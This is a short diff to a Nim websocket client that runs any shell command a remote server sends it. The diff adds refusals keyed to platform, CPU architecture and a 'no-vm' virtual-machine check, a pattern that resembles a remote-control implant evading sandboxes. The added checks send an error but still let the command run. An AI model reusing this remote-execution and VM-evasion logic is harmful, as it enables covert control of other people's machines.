@@ -2,6 +2,7 @@
 # uses this file as the main entry point of the application.
 
 import std/json
+import std/strutils
 import osproc
 import strformat
 import asyncdispatch, ws
@@ -27,6 +28,7 @@ elif hostOs == "windows":
 elif hostOs == "macosx":
   PLATFORM = "darwin"
 
+# TODO: Implement
 var IS_VM: bool
 
 proc main() {.async.} =
@@ -52,7 +54,20 @@ proc main() {.async.} =
 
     echo $packet
 
-    # TODO: Handle limitations
+    # Limitations not tested
+
+    let limitations = packet{"limitations"}.getElems()
+
+    if limitations.len() > 0:
+      for limitation in limitations:
+        if limitation.getStr() == PLATFORM:
+          await ws.send($(%*{"status": 403, "error": "Command not allowed on this platform"}))
+
+        if limitation.getStr() == hostCPU:
+          await ws.send($(%*{"status": 403, "error": "Command not allowed on this architecture"}))
+
+        if limitation.getStr() == "no-vm" and IS_VM:
+          await ws.send($(%*{"status": 403, "error": "Command not allowed in a virtual machine"}))
 
     if packet{"command"}.getStr() != "":
       var res = exec_cmd_ex(packet{"command"}.getStr())
